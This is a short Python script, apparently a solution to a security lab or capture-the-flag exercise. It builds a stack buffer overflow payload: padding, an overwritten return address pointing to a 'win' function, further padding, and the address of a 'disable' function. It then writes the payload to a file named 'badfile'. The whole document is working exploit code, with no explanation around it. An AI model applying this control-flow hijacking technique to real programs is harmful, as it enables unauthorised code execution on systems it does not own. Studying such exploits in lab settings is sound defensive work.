import struct

dst_eip = 238
win = 0x8048539
disable = 0x804850b

atk_vector = 'A'*dst_eip
atk_vector += struct.pack('I', win)
atk_vector += 'A'*(263-len(atk_vector))
atk_vector += struct.pack('I', disable)

f = open('badfile', 'w+')
f.write(atk_vector)
f.close()
